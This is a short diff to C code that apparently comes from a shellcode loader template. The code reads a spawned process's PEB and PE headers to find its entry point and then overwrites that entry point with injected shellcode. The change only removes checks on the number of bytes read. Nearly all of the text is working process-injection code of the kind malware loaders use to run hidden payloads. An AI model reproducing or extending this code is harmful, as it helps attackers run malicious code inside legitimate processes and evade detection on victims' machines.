@@ -62,14 +62,14 @@ int main()
         &pPeb->Reserved3[1],
         &pImage,
         sizeof(pImage),
-        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(pImage);
+        &NumberOfBytesRead);
         
     ReadProcessMemory(
         pi.hProcess,
         (PCHAR)pImage + offsetof(IMAGE_DOS_HEADER, e_lfanew),
         &e_lfanew,
         sizeof(e_lfanew),
-        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(e_lfanew);
+        &NumberOfBytesRead);
     pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)pImage + e_lfanew);
 
     ReadProcessMemory(
@@ -77,7 +77,7 @@ int main()
         (PCHAR)pNtHeaders + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint),
         &AddressOfEntryPoint,
         sizeof(AddressOfEntryPoint),
-        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(pEntry);
+        &NumberOfBytesRead);
     pEntry = (PVOID)((PCHAR)pImage + AddressOfEntryPoint);
     
     WriteProcessMemory(pi.hProcess, pEntry, shellcode, {shellcodeSize}, NULL);
